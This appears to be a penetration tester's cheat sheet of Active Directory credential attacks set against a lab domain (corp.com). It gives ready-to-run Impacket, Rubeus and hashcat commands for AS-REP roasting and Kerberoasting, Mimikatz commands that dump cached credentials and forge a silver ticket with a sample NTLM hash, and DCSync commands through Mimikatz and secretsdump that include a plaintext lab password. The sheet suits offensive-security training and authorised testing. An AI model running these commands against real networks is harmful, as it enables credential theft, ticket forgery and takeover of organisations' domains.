## AS-REP Roasting
AD user account option Do not require Kerberos preauthentication is enabled
To identify users with the enabled AD user account option Do not require Kerberos preauthentication, we can use **PowerView's Get-DomainUser function with the option -PreauthNotRequired on Windows**. On Kali, we can use impacket-GetNPUsers without the -request and -outputfile options.
### Impacket
#### Require username:password
```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```
### Crack 
Let's enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as rule file, and --force to perform the cracking on our Kali VM.
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
### Rubeus
```
.\Rubeus.exe asreproast /nowrap
```

## Kerberoasting
When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.

These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

### Rubeus
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

### Crack
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Impacket
#### Require username:password
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```


## Silver Tickets
First, let's confirm that our current user has no access to the resource of the HTTP SPN mapped to iis_service. To do so, we'll use iwr4 and enter -UseDefaultCredentials so that the credentials of the current user are used to send the web request.
```
iwr -UseDefaultCredentials http://web04
```
Let's start PowerShell as Administrator and launch Mimikatz. As we already learned, we can use privilege::debug and sekurlsa::logonpasswords to extract cached AD credentials.
```mimikatz
privilege::debug
sekurlsa::logonpasswords
```
searching for SID
Note : ** SID
```
whoami /user
example :
corp\jeff **S-1-5-21-1987370270-658905905-1781884369**-1105
```
We need to provide the domain SID (***/sid***:), domain name (***/domain***:), and the target where the SPN runs (***/target***:). We also need to include the SPN protocol (***/service***:), NTLM hash of the SPN (***/rc4***:), and the ***/ptt*** option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.
```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
This means we should have the ticket ready to use in memory. We can confirm this with ***klist***.
```PS
klist
iwr -UseDefaultCredentials http://web04
```

## Domain Controller Sync
The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we can use it from both Windows and Linux. By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller. However, to perform this attack, **we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators,** because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.

let's open a PowerShell window and launch Mimikatz in C:\Tools. For Mimikatz to perform this attack, we can use the lsadump::dcsync module and provide the domain username for which we want to obtain credentials as an argument for /user:. For the purposes of this example, we'll target the domain user dave.
```mimikatz
lsadump::dcsync /user:corp\dave

lsadump::dcsync /user:corp\Administrator
```

### Crack 
```
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

For now, let's perform the dcsync attack from Linux as well. We'll use impacket-secretsdump to acheive this. To launch it, we'll enter the target username dave as an argument for -just-dc-user and provide the credentials of a user with the required rights, as well as the IP of the domain controller in the format domain/user:password@ip.

### Impacket 
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

